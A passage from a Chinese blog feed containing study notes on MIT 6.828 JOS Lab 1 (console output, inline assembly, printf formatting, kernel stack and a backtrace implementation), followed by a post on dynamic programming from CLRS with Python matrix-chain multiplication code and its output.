<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/***** Parallel port output code *****/</span></div><div class="line"><span class="comment">// For information on PC parallel port programming, see the class References</span></div><div class="line"><span class="comment">// page.</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></div><div class="line"><span class="title">lpt_putc</span><span class="params">(<span class="keyword">int</span> c)</span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">int</span> i;</div><div class="line"></div><div class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; !(inb(<span class="number">0x378</span>+<span class="number">1</span>) &amp; <span class="number">0x80</span>) &amp;&amp; i &lt; <span class="number">12800</span>; i++)</div><div class="line">		delay();</div><div class="line">	outb(<span class="number">0x378</span>+<span class="number">0</span>, c);</div><div class="line">	outb(<span class="number">0x378</span>+<span class="number">2</span>, <span class="number">0x08</span>|<span class="number">0x04</span>|<span class="number">0x01</span>);</div><div class="line">	outb(<span class="number">0x378</span>+<span class="number">2</span>, <span class="number">0x08</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>将字符给并口设备。</p>
<p>最后一个是 <code>cga_putc</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></div><div class="line"><span class="title">cga_putc</span><span class="params">(<span class="keyword">int</span> c)</span></div><div class="line">&#123;</div><div class="line">	<span class="comment">// if no attribute given, then use black on white</span></div><div class="line">	<span class="keyword">if</span> (!(c &amp; ~<span class="number">0xFF</span>))</div><div class="line">		c |= <span class="number">0x0700</span>;</div><div class="line"></div><div class="line">	<span class="keyword">switch</span> (c &amp; <span class="number">0xff</span>) &#123;</div><div class="line">	<span class="keyword">case</span> <span class="string">'\b'</span>:</div><div class="line">		<span class="keyword">if</span> (crt_pos &gt; <span class="number">0</span>) &#123;</div><div class="line">			crt_pos--;</div><div class="line">			crt_buf[crt_pos] = (c &amp; ~<span class="number">0xff</span>) | <span class="string">' '</span>;</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	<span class="keyword">case</span> <span class="string">'\n'</span>:</div><div class="line">		crt_pos += CRT_COLS;</div><div class="line">		<span class="comment">/* fallthru */</span></div><div class="line">	<span class="keyword">case</span> <span class="string">'\r'</span>:</div><div class="line">		crt_pos -= (crt_pos % CRT_COLS);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	<span class="keyword">case</span> <span class="string">'\t'</span>:</div><div class="line">		cons_putc(<span class="string">' '</span>);</div><div class="line">		cons_putc(<span class="string">' '</span>);</div><div class="line">		cons_putc(<span class="string">' '</span>);</div><div class="line">		cons_putc(<span class="string">' '</span>);</div><div class="line">		cons_putc(<span class="string">' '</span>);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	<span class="keyword">default</span>:</div><div class="line">		crt_buf[crt_pos++] = c;		<span class="comment">/* write the character */</span></div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">// What is the purpose of this?</span></div><div class="line">	<span class="keyword">if</span> (crt_pos &gt;= CRT_SIZE) &#123;</div><div class="line">		<span class="keyword">int</span> i;</div><div class="line"></div><div class="line">		memmove(crt_buf, crt_buf + CRT_COLS, (CRT_SIZE - CRT_COLS) * <span class="keyword">sizeof</span>(<span class="keyword">uint16_t</span>));</div><div class="line">		<span class="keyword">for</span> (i = CRT_SIZE - CRT_COLS; i &lt; CRT_SIZE; i++)</div><div class="line">			crt_buf[i] = <span class="number">0x0700</span> | <span class="string">' '</span>;</div><div class="line">		crt_pos -= CRT_COLS;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">/* move that little blinky thing */</span></div><div class="line">	outb(addr_6845, <span class="number">14</span>);</div><div class="line">	outb(addr_6845 + <span class="number">1</span>, crt_pos &gt;&gt; <span class="number">8</span>);</div><div class="line">	outb(addr_6845, <span class="number">15</span>);</div><div class="line">	outb(addr_6845 + <span class="number">1</span>, crt_pos);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>首先 <code>!(c &amp; ~0xFF)</code> 是否在 0 ~ 255 之前。<code>\b</code>很容易理解，就是退格键，让缓冲区 <code>crt_buf</code> 的下标 <code>crt_pos</code> 减1。其他的同理，case都是格式操作。default就是往缓冲区里写入字符c。之后就是当缓存超过CRT_SIZE，就是用 <code>memmove</code> 复制内存内容。</p>
<p>最后四句代码是将缓冲区的内容输出到显示屏。</p>
<h3 id="u5185_u8054_u6C47_u7F16tips"><a href="#u5185_u8054_u6C47_u7F16tips" class="headerlink" title="内联汇编tips"></a>内联汇编tips</h3><p>这里提一下内联汇编。 <code>inb</code> 和 <code>outb</code> 都是内联汇编。其中 <code>inb</code> 函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">inb(<span class="keyword">int</span> port)</div><div class="line">&#123;</div><div class="line">    <span class="keyword">uint8_t</span> data;</div><div class="line">    __asm __volatile(<span class="string">"inb %w1,%0"</span> : <span class="string">"=a"</span> (data) : <span class="string">"d"</span> (port));</div><div class="line">    <span class="keyword">return</span> data;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p> “__asm__“表示后面的代码为内联汇编， “__volatile__“表示编译器不要优化代码。括号里是汇编指令。</p>
<p>内联汇编的模板是：__asm__(汇编语句模板: 输出部分: 输入部分: 破坏描述部分)。 共四个部分：汇编语句模板，输出部分，输入部分，破坏描述部分，各部分使用”:”格开，汇编语句模板必不可少， 其他三部分可选，如果使用了后面的部分，而前面部分为空，也需要用”:”格开，相应部分内容为空。如上面程序则只是用了前三部分。</p>
<p>“inb %w1,%0”表示汇编语句模板， “=a” (data)是输出部分，”d” (port)是输入部分。本例中只有两个：“data” 和“port”，他们按照出现的顺序分别与指令操作数 “%0”,“%1”对应。每个输出操作数的限定字符串必须包含“=”表示他是一个输出操作数。例如”=a” (data)就是一个输出操作数，其限定字符串为”=a”，(data)就是C语言变量。</p>
<p>之后来看 <code>lib/printfmt.c</code> 的代码。首先来看 <code>kern/printf.c</code> 里提到的 <code>vprintfmt</code>函数。</p>
<p>代码太长了，简单点先说一下它的四个输入参数。</p>
<ul>
<li>void (*putch)(int, void*) 函数指针，一般调用输出到屏幕上的函数</li>
<li>void *putdat 输入字符要放的内存地址指针</li>
<li>const char *fmt 格式化字符串</li>
<li>va_list ap 多个输入参数</li>
</ul>
<p>在vprintf里传入的参数putdat是cnt的地址，cnt是用来做计数器的。cprintf功能类似。</p>
<p>分析完三个文件，回到题目，要去实现%o的格式化输出。在 <code>lib/printfmt.c</code> 可以看到要填写的地方。参考上面 <code>case &#39;u&#39;</code> 的写法。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">case</span> <span class="string">'o'</span>:</div><div class="line">	num = getuint(&amp;ap, lflag);</div><div class="line">	base = <span class="number">8</span>;</div><div class="line">	<span class="keyword">goto</span> number;</div></pre></td></tr></table></figure>
<p>修改完以后保存，<code>make clean</code> 之后运行，会发现启动以后，qemu里JOS启动时会出现这样一行字。</p>
<p><img src="16.png" alt=""></p>
<p>第一行完成了6828转八进制。</p>
<p>解释 <code>console.c</code> 中的这段代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (crt_pos &gt;= CRT_SIZE) &#123;</div><div class="line">	<span class="keyword">int</span> i;</div><div class="line"></div><div class="line">	memmove(crt_buf, crt_buf + CRT_COLS, (CRT_SIZE - CRT_COLS) * <span class="keyword">sizeof</span>(<span class="keyword">uint16_t</span>));</div><div class="line">	<span class="keyword">for</span> (i = CRT_SIZE - CRT_COLS; i &lt; CRT_SIZE; i++)</div><div class="line">		crt_buf[i] = <span class="number">0x0700</span> | <span class="string">' '</span>;</div><div class="line">	crt_pos -= CRT_COLS;</div><div class="line">	&#125;</div></pre></td></tr></table></figure>
<p>简单点说就是当字符长度超过CRT_SIZE， 证明屏幕放不下了，需要页面向上滚动一行。</p>
<p>观察下面的代码，分析fmt和ap指向什么。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> x = <span class="number">1</span>, y = <span class="number">3</span>, z = <span class="number">4</span>;</div><div class="line">cprintf(<span class="string">"x %d, y %x, z %d\n"</span>, x, y, z);</div></pre></td></tr></table></figure>
<p>fmt 指向的是格式字符串 “x %d, y %x, z %d\n”，ap 指向的是参数 x, y, z。<br>将这段代码加入到 <code>kern\monitor.c</code> 并重新编译运行，即可显示结果。</p>
<p>运行这段代码。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0x00646c72</span>;</div><div class="line">cprintf(<span class="string">"H%x Wo%s"</span>, <span class="number">57616</span>, &amp;i);</div></pre></td></tr></table></figure>
<p>输出是 <code>He110 World</code>。 这很神奇。首先 %x 是指十六进制，所以将 57616 转为十六进制就是 <code>e110</code>。在看后面， &amp;i 是指 i 的地址， %s是指输出为字符串，所以输出的应该是变量i所在地址的字符串。其实就是将i转换为字符串来输出。因为x86是小端模式，并且是int类型，所以存放的方式是四个字节，所以就会将i拆分开来，变成 0x72, 0x6c, 0x64, 0x00. 所以转换为字符就是rld\0，所以得到了上面的输出结果。</p>
<p>运行以下代码。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cprintf(<span class="string">"x=%d y=%d"</span>, <span class="number">3</span>);</div></pre></td></tr></table></figure>
<p>结果是 <code>x=3 y=-267380708</code>，y出问题是因为没有被指定值，所以输出的是一个不确定的值。</p>
<h3 id="u5806_u6808"><a href="#u5806_u6808" class="headerlink" title="堆栈"></a>堆栈</h3><p>最后这部分，要研究C语言是如何在x86框架上使用堆栈的。需要查看指令寄存器(IP)的值的变化。</p>
<h4 id="Exercise_9"><a href="#Exercise_9" class="headerlink" title="Exercise 9"></a>Exercise 9</h4><p>研究内核是在哪初始化堆栈，找出堆栈存放在内存的位置。内核是如何保存一块空间给堆栈的？堆栈指针指向这块区域的哪儿？</p>
<p>看了几个文件以后，发现在 <code>kern/entry.S</code> 中提到了设置堆指针和栈指针。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"># Clear the frame pointer register (EBP)</div><div class="line"># so that once we get into debugging C code,</div><div class="line"># stack backtraces will be terminated properly.</div><div class="line">movl	$0x0,%ebp			# nuke frame pointer</div><div class="line"></div><div class="line"># Set the stack pointer</div><div class="line">movl	$(bootstacktop),%esp</div></pre></td></tr></table></figure>
<p>为了查看堆的位置，所以要使用gdb，同样还是 <code>b *0x10000c</code> 打断点进入 entry。 si 一步步执行，在 <code>0x10002d:    jmp    *%eax</code> 之后，下一条指令变为 <code>0xf010002f &lt;relocated&gt;:    mov    $0x0,%ebp</code>。其实地址应该还是 0x10002f，所以这里的 0xf010002f 是因为开启的虚拟地址。</p>
<p>通过 gdb 发现 <code>0xf0100034 &lt;relocated+5&gt;:    mov    $0xf0110000,%esp</code>， 也就是说%esp也就是bootstacktop的值为0xf0110000。其中 <code>kern/entry.S</code> 的 <code>KSTKSIZE</code> 应该就是堆栈的大小，通过跳转，发现在 <code>inc/memlayout.h</code> 里提到了堆栈。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">// Kernel stack.</div><div class="line">#define KSTACKTOP	KERNBASE</div><div class="line">#define KSTKSIZE	(8*PGSIZE)   		// size of a kernel stack</div><div class="line">#define KSTKGAP		(8*PGSIZE)   		// size of a kernel stack guard</div></pre></td></tr></table></figure>
<p><code>PGSIZE</code> 定义在 <code>inc/mmu.h</code> 中，值为 4096，所以 KSTKSIZE 为 32KB。 使用 <code>info registers</code> 可以查出esp和ebp的值。最高地址为bootstacktop的值，也就是0xf0110000。</p>
<p>x86堆栈指针(esp寄存器)指向堆栈正在使用的最低位置，低于这个位置的空间还没使用。ebp寄存器(基址指针寄存器)与程序有关。详细的内容可以看 CSAPP。</p>
<h4 id="Exercise_10"><a href="#Exercise_10" class="headerlink" title="Exercise 10"></a>Exercise 10</h4><p>研究 <code>obj/kern/kernel.asm</code> 中 test_backtrace 向堆栈里压入的信息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">// Test the stack backtrace function (lab 1 only)</div><div class="line">void</div><div class="line">test_backtrace(int x)</div><div class="line">&#123;</div><div class="line">	cprintf(&quot;entering test_backtrace %d\n&quot;, x);</div><div class="line">	if (x &gt; 0)</div><div class="line">		test_backtrace(x-1);</div><div class="line">	else</div><div class="line">		mon_backtrace(0, 0, 0);</div><div class="line">	cprintf(&quot;leaving test_backtrace %d\n&quot;, x);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>使用单步调试和 info registers 来查看esp和ebp的变化。</p>
<p>运行test_backtrace前，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">esp            0xf010ffdc	0xf010ffdcebp            0xf010fff8	0xf010fff8</div></pre></td></tr></table></figure>
<p>执行的操作为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">0xf0100040 &lt;test_backtrace&gt;:	push   %ebp  #栈底指针ebp压入栈中0xf0100041 &lt;test_backtrace+1&gt;:	mov    %esp,%ebp  #将栈顶指针esp指向栈底指针ebp0xf0100043 &lt;test_backtrace+3&gt;:	push   %ebx  #压入ebx基底寄存器</div><div class="line">0xf0100044 &lt;test_backtrace+4&gt;:	sub    $0xc,%esp  #栈顶指针esp向低地址移动0xc也就是12bytes。</div><div class="line">0xf0100047 &lt;test_backtrace+7&gt;:	mov    0x8(%ebp),%ebx  </div><div class="line">0xf010004a:	53                   	push   %ebx #将%ebp+8位置的变量压入栈中，为之后的调用做准备。</div></pre></td></tr></table></figure>
<p>总之，这段程序算是递归，递归就是ebp存放返回地址，esp是存放调用时的参数。</p>
<p>现在需要实现mon_backtrace()这个函数，需要显示ebp，eip 和 args。ebp是基址指针，eip是返回指令指针。</p>
<p>简单实现backtrace，实现效果如下</p>
<p><img src="17.png" alt=""></p>
<p>实现如下。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span></span></div><div class="line"><span class="title">mon_backtrace</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">struct</span> Trapframe *tf)</span></div><div class="line">&#123;</div><div class="line">	<span class="comment">// Your code here.</span></div><div class="line">	<span class="keyword">int</span> j;</div><div class="line">	<span class="keyword">uint32_t</span> ebp = read_ebp();</div><div class="line">	<span class="keyword">uint32_t</span> eip = *((<span class="keyword">uint32_t</span> *)ebp+<span class="number">1</span>);</div><div class="line">	cprintf(<span class="string">"Stack backtrace:\n"</span>);</div><div class="line">	<span class="keyword">while</span> ((<span class="keyword">int</span>)ebp != <span class="number">0</span>)</div><div class="line">	&#123;</div><div class="line">		cprintf(<span class="string">"  ebp:0x%08x eip:0x%08x args:"</span>, ebp, eip);</div><div class="line">		<span class="keyword">uint32_t</span> *args = (<span class="keyword">uint32_t</span> *)ebp + <span class="number">2</span>;</div><div class="line">		<span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">5</span>; j ++) &#123;</div><div class="line">            cprintf(<span class="string">"%08x "</span>, args[j]);</div><div class="line">        &#125;</div><div class="line">        cprintf(<span class="string">"\n"</span>);</div><div class="line">        eip = ((<span class="keyword">uint32_t</span> *)ebp)[<span class="number">1</span>];</div><div class="line">        ebp = ((<span class="keyword">uint32_t</span> *)ebp)[<span class="number">0</span>];</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="Exercise_11"><a href="#Exercise_11" class="headerlink" title="Exercise 11"></a>Exercise 11</h4><p>修改上面实现的backtrace，要显示详细的函数地址。可以使用 <code>kern/kdebug.c</code> 的 debuginfo_eip()。在查看debuginfo_eip时发现其中有一段代码需要填写。这段代码是填写eip_line。这里用到了写好的二分查找。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// Search within [lline, rline] for the line number stab.</span></div><div class="line">	<span class="comment">// If found, set info-&gt;eip_line to the right line number.</span></div><div class="line">	<span class="comment">// If not found, return -1.</span></div><div class="line">	<span class="comment">//</span></div><div class="line">	<span class="comment">// Hint:</span></div><div class="line">	<span class="comment">//	There's a particular stabs type used for line numbers.</span></div><div class="line">	<span class="comment">//	Look at the STABS documentation and &lt;inc/stab.h&gt; to find</span></div><div class="line">	<span class="comment">//	which one.</span></div><div class="line">	<span class="comment">// Your code here.</span></div><div class="line">	stab_binsearch(stabs, &amp;lline, &amp;rline, N_SLINE, addr);</div><div class="line">	<span class="keyword">if</span>(lline &lt;= rline)&#123;</div><div class="line">		info-&gt;eip_line = stabs[rline].n_desc;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">else</span></div><div class="line">		info-&gt;eip_line = <span class="number">-1</span>;</div></pre></td></tr></table></figure>
<p>关于 stab 相关内容，查看第三个参考资料，实话说，我对于stab理解的比较模糊。</p>
<h4 id="Exercise_12"><a href="#Exercise_12" class="headerlink" title="Exercise 12"></a>Exercise 12</h4><p>将backtrace嵌入终端中，使其可以被调用。只需要修改 <code>kern/monitor.c</code> 的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">static</span> <span class="keyword">struct</span> Command commands[] = &#123;</div><div class="line">	&#123; <span class="string">"help"</span>, <span class="string">"Display this list of commands"</span>, mon_help &#125;,</div><div class="line">	&#123; <span class="string">"kerninfo"</span>, <span class="string">"Display information about the kernel"</span>, mon_kerninfo &#125;,</div><div class="line">	&#123; <span class="string">"backtrace"</span>, <span class="string">"Display a listing of function call frames"</span>, mon_backtrace&#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h2 id="u6700_u540E_u7684_u6700_u540E"><a href="#u6700_u540E_u7684_u6700_u540E" class="headerlink" title="最后的最后"></a>最后的最后</h2><p>至此,lab1已经算是完成了，简单了解了操作系统的启动过程，很充实很值得思考。</p>
<p><img src="18.png" alt=""></p>
<h2 id="u53C2_u8003_u8D44_u6599"><a href="#u53C2_u8003_u8D44_u6599" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="http://www.cnblogs.com/fatsheep9146/category/769143.html" target="_blank" rel="external">MIT 6.828 JOS 操作系统学习笔记</a></p>
<p><a href="http://blog.chinaunix.net/uid-24585655-id-2125525.html" target="_blank" rel="external">AT&amp;T_GCC_ASM简单介绍</a></p>
<p><a href="http://blog.csdn.net/roger__wong/article/details/8623941" target="_blank" rel="external">JOS学习笔记（四）</a></p>
]]></content>
    
    <summary type="html">
    
      MIT6.828
    
    </summary>
    
    
      <category term="MIT6.828" scheme="http://xinqiu.me/tags/MIT6-828/"/>
    
  </entry>
  
  <entry>
    <title>算法导论动态规划学习</title>
    <link href="http://xinqiu.me/2016/10/04/CLRS-2/"/>
    <id>http://xinqiu.me/2016/10/04/CLRS-2/</id>
    <published>2016-10-03T16:00:00.000Z</published>
    <updated>2016-10-06T10:47:15.000Z</updated>
    
    <content type="html"><![CDATA[<script type="text/x-mathjax-config">
MathJax.Hub.Config({
  tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]}
});
</script>

<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>

<p>动态规划方法通常是用来求解<strong>最优化问题</strong>(optimization problem)。比起分治方法，动态规划对于子问题只求解一次，算是用空间换时间。</p>
<p>书中提到了设计动态规划算法的4个步骤：</p>
<ol>
<li>刻画一个最优解的结构特此</li>
<li>递归地定义最优解的值</li>
<li>计算最优解的值，通常采用自底向上的方法</li>
<li>利用计算出的信息构造一个最优解</li>
</ol>
<a id="more"></a>
<h2 id="u94A2_u6761_u5207_u5272"><a href="#u94A2_u6761_u5207_u5272" class="headerlink" title="钢条切割"></a>钢条切割</h2><p>这个算是比较简单的应用动态规划的例子。只需要用一个一维数组保存最有解就可以了。书中提到一个子问题图，很形象的能表达出各个子问题之间的关系。这里钢条切割使用才思想是分两块，左边一部分完全不切割，右边随便切割，然后比较产生的利润最大的组合，所以右边就变成了子问题。</p>
<h2 id="u77E9_u9635_u94FE_u4E58_u6CD5"><a href="#u77E9_u9635_u94FE_u4E58_u6CD5" class="headerlink" title="矩阵链乘法"></a>矩阵链乘法</h2><p>首先需要知道一个概念是只有两个矩阵A和B相容，即A的列数等于B的行数时，才能相乘。矩阵链乘法问题就是求完全括号化的方案，不同的括号方法产生不同次数的标量乘法。首先可以得到一个穷举的算法思路，令$P(n)$表示可供选择的括号化方案的数量，当$n=1$时，显然只有一种完全括号化方案，当$n \geqslant 2$时，完全括号化的矩阵乘积可描述为两个完全括号化的部分积相乘的形式，而两个部分积的划分点在第$k$个矩阵和第$k+1$个矩阵之间。所以可以得到如下递归公式：<br><img src="1.gif" alt=""><br>当然这个需要优化。所以引入储存子问题解的变量m，m[i,j]表示计算矩阵$A_{i,j}$所需标量乘法次数的最小值。假设 $A_{i}A_{i+1}\cdots A_{j}$ 的最优括号化方案的分割点在矩阵$A_{k}$和$A_{k+1}$之间，其中$i\leqslant k &lt;j$。那么，m[i,j]等于计算 $A_{i..k}$和 $A_{k+1..j}$的代价加上两者相乘的代价的最小值。因此得到<br>$$ m[i,j]=m[i,k]+m[k+1,j]+p_{i-1}p_{k}p_{j}$$<br>因为不知道$k$的具体值，所以$k$有$ j-i $种可能，所以<br><img src="2.gif" alt=""><br>采用自底向上表格法代替上面公式的递归算法来计算最优代价。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">MaxtrixChainOrder</span><span class="params">(p)</span>:</span></div><div class="line">    n = len(p)<span class="number">-1</span></div><div class="line">    m = [[<span class="number">0</span>]*(n) <span class="keyword">for</span> _ <span class="keyword">in</span> xrange(n)]</div><div class="line">    s = [[<span class="number">0</span>]*(n) <span class="keyword">for</span> _ <span class="keyword">in</span> xrange(n)]</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, n):</div><div class="line">        m[i][i] = <span class="number">0</span></div><div class="line">    <span class="keyword">for</span> l <span class="keyword">in</span> xrange(<span class="number">2</span>, n+<span class="number">1</span>):</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, n - l + <span class="number">1</span>):</div><div class="line">            j = i + l <span class="number">-1</span></div><div class="line">            m[i][j] = sys.maxint</div><div class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> xrange(i, j):</div><div class="line">                q = m[i][k]+m[k+<span class="number">1</span>][j]+p[i]*p[k+<span class="number">1</span>]*p[j+<span class="number">1</span>]</div><div class="line">                <span class="keyword">if</span> q &lt; m[i][j]:</div><div class="line">                    m[i][j] = q</div><div class="line">                    s[i][j] = k</div><div class="line">    <span class="keyword">return</span> m, s</div><div class="line"></div><div class="line">m, s = MaxtrixChainOrder([<span class="number">30</span>,<span class="number">35</span>,<span class="number">15</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">20</span>,<span class="number">25</span>])</div><div class="line"><span class="keyword">print</span> <span class="string">'m:'</span></div><div class="line"><span class="keyword">print</span> <span class="string">'\n'</span>.join(map(str, m))</div><div class="line"><span class="keyword">print</span> <span class="string">'s:'</span></div><div class="line"><span class="keyword">print</span> <span class="string">'\n'</span>.join(map(str, s))</div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">'矩阵链乘法的方案是:'</span>,</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">PrintOptimalParens</span><span class="params">(s, i, j)</span>:</span></div><div class="line">    ret = <span class="string">''</span></div><div class="line">    <span class="keyword">if</span> i == j:</div><div class="line">        <span class="keyword">return</span> <span class="string">'A'</span>+str(j)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        ret += <span class="string">'('</span></div><div class="line">        ret += PrintOptimalParens(s, i, s[i][j])</div><div class="line">        ret += PrintOptimalParens(s, s[i][j]+<span class="number">1</span>, j)</div><div class="line">        ret +=  <span class="string">')'</span></div><div class="line">        <span class="keyword">return</span> ret</div><div class="line"></div><div class="line"><span class="keyword">print</span> PrintOptimalParens(s, <span class="number">0</span>, <span class="number">5</span>)</div></pre></td></tr></table></figure>
<p>得到以下输出</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">m:</div><div class="line">[0, 15750, 7875, 9375, 11875, 15125]</div><div class="line">[0, 0, 2625, 4375, 7125, 10500]</div><div class="line">[0, 0, 0, 750, 2500, 5375]</div><div class="line">[0, 0, 0, 0, 1000, 3500]</div><div class="line">[0, 0, 0, 0, 0, 5000]</div><div class="line">[0, 0, 0, 0, 0, 0]</div><div class="line">s:</div><div class="line">[0, 0, 0, 2, 2, 2]</div><div class="line">[0, 0, 1, 2, 2, 2]</div><div class="line">[0, 0, 0, 2, 2, 2]</div><div class="line">[0, 0, 0, 0, 3, 4]</div><div class="line">[0, 0, 0, 0, 0, 4]</div><div class="line">[0, 0, 0, 0, 0, 0]</div><div class="line">矩阵链乘法的方案是: ((A0(A1A2))((A3A4)A5))</div></pre></td></tr></table></figure>
